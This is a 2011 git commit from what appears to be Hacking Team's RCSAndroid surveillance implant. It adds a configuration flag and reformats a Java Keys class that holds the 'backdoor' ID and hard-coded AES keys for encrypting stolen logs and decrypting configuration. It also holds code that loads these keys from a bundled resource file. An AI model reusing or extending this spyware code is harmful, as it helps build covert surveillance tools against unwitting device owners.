1070ed0ceb57862c36a78007df8a0d448494301f
Zeno <zeno@hackingteam.it>
2011-05-17 12:59:45 +0200

    risorse per chiavi ok
    Signed-off-by: Zeno <zeno@hackingteam.it>

--- RCSAndroid/src/com/android/service/auto/Cfg.java
+++ RCSAndroid/src/com/android/service/auto/Cfg.java
@@ -4,4 +4,5 @@ public class Cfg {
 	//ATTENZIONE, NON CAMBIARE A MANO LA VARIABILE DEBUG, VIENE RISCRITTA DA ANT
 	public static final boolean DEBUG = true;
 	public static final boolean EXP = true;
+	public static final boolean KEYS = false;
 }
--- RCSAndroid/src/com/android/service/crypto/Keys.java
+++ RCSAndroid/src/com/android/service/crypto/Keys.java
@@ -23,7 +23,7 @@ import com.android.service.util.Utils;
 public class Keys {
 
 	/** The use fake. */
-	static boolean useFake = Cfg.DEBUG;
+	static boolean useFake = Cfg.KEYS;
 
 	/** The singleton. */
 	private volatile static Keys singleton;
@@ -48,25 +48,26 @@ public class Keys {
 
 		return singleton;
 	}
-	
-	protected Keys(boolean fromResources){
-		if(fromResources){
-		Resources resources = Status.getAppContext().getResources();
-		
-		final String androidId = Secure.getString(Status.getAppContext()
-				.getContentResolver(), Secure.ANDROID_ID);
 
-		instanceId=Encryption.SHA1(androidId.getBytes());
-		
-		final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.resources), 0); // resources.bin
-		 
-		backdoorId=Utils.copy(resource, 64, 14);  
-		aesKey=Utils.copy(resource, 142, 32);  
-		confKey=Utils.copy(resource, 238, 32);  
-		challengeKey=Utils.copy(resource, 334, 32);  
-		
+	protected Keys(boolean fromResources) {
+		if (fromResources) {
+			Resources resources = Status.getAppContext().getResources();
+
+			final String androidId = Secure.getString(Status.getAppContext()
+					.getContentResolver(), Secure.ANDROID_ID);
+
+			instanceId = Encryption.SHA1(androidId.getBytes());
+
+			final byte[] resource = Utils.inputStreamToBuffer(
+					resources.openRawResource(R.raw.resources), 0); // resources.bin
+
+			backdoorId = Utils.copy(resource, 64, 14);
+			aesKey = Utils.copy(resource, 142, 32);
+			confKey = Utils.copy(resource, 238, 32);
+			challengeKey = Utils.copy(resource, 334, 32);
+
 		}
-		
+
 	}
 
 	// Subversion
@@ -82,29 +83,26 @@ public class Keys {
 
 	// 16 bytes that uniquely identifies the backdoor, NULL-terminated
 	/** The Constant g_BackdoorID. */
-	private static  byte[] backdoorId = { 'a', 'v', '3', 'p', 'V', 'c',
-			'k', '1', 'g', 'b', '4', 'e', 'R', '2', 'd', '8', 0 };
-	
+	private static byte[] backdoorId = { 'a', 'v', '3', 'p', 'V', 'c', 'k',
+			'1', 'g', 'b', '4', 'e', 'R', '2', 'd', '8', 0 };
+
 	// AES key used to encrypt logs
 	/** The Constant g_AesKey. */
-	private static byte[] aesKey = { '3', 'j', '9', 'W', 'm', 'm', 'D',
-			'g', 'B', 'q', 'y', 'U', '2', '7', '0', 'F', 'T', 'i', 'd', '3',
-			'7', '1', '9', 'g', '6', '4', 'b', 'P', '4', 's', '5', '2' };
+	private static byte[] aesKey = { '3', 'j', '9', 'W', 'm', 'm', 'D', 'g',
+			'B', 'q', 'y', 'U', '2', '7', '0', 'F', 'T', 'i', 'd', '3', '7',
+			'1', '9', 'g', '6', '4', 'b', 'P', '4', 's', '5', '2' };
 
 	// AES key used to decrypt configuration
 	/** The Constant g_ConfKey. */
-	private static byte[] confKey = { 'A', 'd', 'f', '5', 'V', '5',
-			'7', 'g', 'Q', 't', 'y', 'i', '9', '0', 'w', 'U', 'h', 'p', 'b',
-			'8', 'N', 'e', 'g', '5', '6', '7', '5', '6', 'j', '8', '7', 'R' };
-
-
+	private static byte[] confKey = { 'A', 'd', 'f', '5', 'V', '5', '7', 'g',
+			'Q', 't', 'y', 'i', '9', '0', 'w', 'U', 'h', 'p', 'b', '8', 'N',
+			'e', 'g', '5', '6', '7', '5', '6', 'j', '8', '7', 'R' };
 
 	// Challenge key
 	/** The Constant g_Challenge. */
-	private static  byte[] challengeKey = { 'f', '7', 'H', 'k', '0', 'f',
-			'5', 'u', 's', 'd', '0', '4', 'a', 'p', 'd', 'v', 'q', 'w', '1',
-			'3', 'F', '5', 'e', 'd', '2', '5', 's', 'o', 'V', '5', 'e', 'D' };
-
+	private static byte[] challengeKey = { 'f', '7', 'H', 'k', '0', 'f', '5',
+			'u', 's', 'd', '0', '4', 'a', 'p', 'd', 'v', 'q', 'w', '1', '3',
+			'F', '5', 'e', 'd', '2', '5', 's', 'o', 'V', '5', 'e', 'D' };
 
 	/**
 	 * Checks for been binary patched.
